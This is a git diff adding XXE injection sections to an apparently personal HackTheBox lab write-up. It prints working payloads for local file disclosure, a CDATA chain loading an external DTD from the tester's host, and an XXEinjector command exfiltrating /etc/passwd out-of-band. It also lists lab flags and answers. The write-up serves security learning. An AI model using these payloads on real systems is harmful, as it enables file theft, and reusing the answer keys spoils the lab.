@@ -10,9 +10,14 @@
     2. [Bypassing Encoded References](#bypassing-encoded-references)
     3. [IDOR in Insecure APIs](#idor-in-insecure-apis)
     4. [Chaining IDOR Vulnerabilities](#chaining-idor-vulnerabilities)
+3. [XML External Entity (XXE) Injection](#xml-external-entity-xxe-injection)
+    1. [Local File Disclosure](#local-file-disclosure)
+    2. [Advanced File Disclosure](#advanced-file-disclosure)
+    3. [Blind Data Exfiltration](#blind-data-exfiltration)
 
 ## Tools/Useful Links
 1. Burpsuite
+2. [XXEinjector](https://github.com/enjoiz/XXEinjector)
 
 ## HTTP Verb Tampering
 ### Bypassing Basic Authentication
@@ -129,3 +134,85 @@
     3. Refresh **/profile/index.php** to get the flag.
 
         We can see the flag in the page. The answer is `HTB{1_4m_4n_1d0r_m4573r}`.
+
+    
+## XML External Entity (XXE) Injection
+### Local File Disclosure
+#### Challenges
+1. Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.
+
+    We can solve this by using XXE Injection. We can use the following payload:
+
+    ```xml
+    <!DOCTYPE email [
+    <!ENTITY exploit SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
+    ]>
+    ```
+    This payload will read the content of the 'connection.php' file and encode it with base64. We also need to add **exploit** entity to the displayed field.
+
+    ![alt text](<Assets/Local File Disclosure - 1.png>)
+
+    The answer is `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg`.
+
+### Advanced File Disclosure
+#### Challenges
+1. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').
+
+    In this challenge, i have solved it with CDATA method. First, we need to modify the XML request with the following content:
+
+    ```xml
+    <!DOCTYPE email [
+    <!ENTITY % begin "<![CDATA[">
+    <!ENTITY % file SYSTEM "file:///flag.php">
+    <!ENTITY % end "]]>"> 
+    <!ENTITY % xxe SYSTEM "http://10.10.14.101:8000/xxe.dtd"> 
+    %xxe;
+    ]>
+    ...
+    <email>&joined;</email>
+    ...
+    ```
+    We need to create an external DTD file named xxe.dtd. This file is necessary because XML rules forbid combining the CDATA tags and the file content directly in the main request.
+
+    ```xml
+    <!ENTITY joined "%begin;%file;%end;">
+    ```
+    Aftter that, we need to host xxe.dtd file on our local machine. We can use python  to host it.
+
+    ```bash
+    python3 -m http.server 8000
+    ```
+    ![alt text](<Assets/Advanced File Disclosure - 1.png>)
+    
+    The answer is `HTB{3rr0r5_c4n_l34k_d474}`.
+
+### Blind Data Exfiltration
+#### Challenges
+1. Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.
+
+    We can solve this with OOB Exfiltration method. In here, i solved it with XXEinjector tool. By using this tool, we need to get the request of **/blind** endpoint with Burp Suite. We dont need to include the full XML data. We only need the first line of XML data following with **XXEINJECT** on it. It will look like this:
+
+    ```txt
+    POST /blind/submitDetails.php HTTP/1.1
+    Host: 10.129.234.170
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Referer: http://10.129.234.170/blind/
+    Content-Type: text/plain;charset=UTF-8
+    Content-Length: 139
+    Origin: http://10.129.234.170
+    DNT: 1
+    Connection: keep-alive
+    Priority: u=0
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    XXEINJECT
+    ```
+    Once we save the request, we can use XXEinjector tool.
+
+    ```bash
+    xxeinjector --host=10.10.14.101 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+    ```
+    We can find the result in the Log folder. The answer is `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`.
